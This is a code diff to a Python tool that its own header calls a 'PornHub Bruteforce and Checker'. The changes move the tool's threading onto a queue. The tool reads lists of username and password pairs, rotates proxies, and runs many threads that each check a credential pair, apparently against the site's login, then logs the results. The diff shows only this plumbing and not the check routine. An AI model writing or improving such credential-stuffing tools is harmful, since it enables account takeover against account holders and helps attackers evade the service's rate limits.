@@ -2,7 +2,7 @@ import requests
 import sys, os
 import random
 import datetime
-import threading
+import threading, queue
 import time
 from helpers.colors import bcolors
 from bs4 import BeautifulSoup as soup
@@ -13,8 +13,10 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
 
+
 class Brute(object):
     def __init__(self):
+        self.q = queue.Queue()
         self.projectName = "PornHub"
         self.projectFullName = "PornHub Bruteforce and Checker"
         self.description = "Author : Pirate2110"
@@ -88,13 +90,14 @@ class Brute(object):
             for line in tags:
                 #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                 self.lines.append(line.strip())
+                self.q.put(line.strip())
             print('Count of accounts : ' + str(len(self.lines)))  
-        self.count_list = len(self.lines) 
+        self.count_list = len(self.lines)
+        
         if "http" in self.proxylink:
-            ptt = threading.Thread(target=self.updateProxyLink)
-            ptt.daemon = True
+            ptt = threading.Thread(target=self.updateProxyLink, daemon=True)
             ptt.start()
-            time.sleep(5)
+            time.sleep(1)
         else:
             with open(self.proxyname, "r") as tags:
                 for line in tags:
@@ -107,7 +110,6 @@ class Brute(object):
     def startth(self):
         for i in range(self.thread_count):
             t = threading.Thread(target=self.work)
-            t.daemon = True
             t.start()
 
     def updateProxyLink(self):
@@ -121,7 +123,7 @@ class Brute(object):
     def work(self):
     #print(bcolors.WARNING + '[+] Start scanning : ' + str(self.lines[0]) + bcolors.ENDC)
         while self.running:
-            if (len(self.lines) == 0):
+            if self.q.empty():
                 self.stop()
                 break
 
@@ -131,8 +133,8 @@ class Brute(object):
                 sys.stdout.flush()
             
             self.lock.acquire()
-            trl = self.lines[0]
-            self.lines.pop(0)
+            trl = self.q.get_nowait()
+            self.q.task_done()
             self.lock.release()
 
             if ":" in trl:
@@ -141,7 +143,8 @@ class Brute(object):
                 self.check(trl.split(';')[0], trl.split(';')[1])
             else :
                 pass
-             
+            
+            time.sleep(0.1)
         self.exit_thread()
 
     def exit_thread(self):
@@ -153,7 +156,7 @@ class Brute(object):
         return str(random.choice(self.prlines))
 
     def writelog(self, file, log):
-        dirr = self.projectName + "/" + str(self.today.strftime("%H.%M.%S")) + "/" +file
+        dirr = "logs/" + self.projectName + "/" + str(self.today.strftime("%H.%M.%S")) + "/" +file
         os.makedirs(os.path.dirname(dirr), exist_ok=True)
         with open(dirr, 'a') as the_file:
             the_file.write(log + '\n')
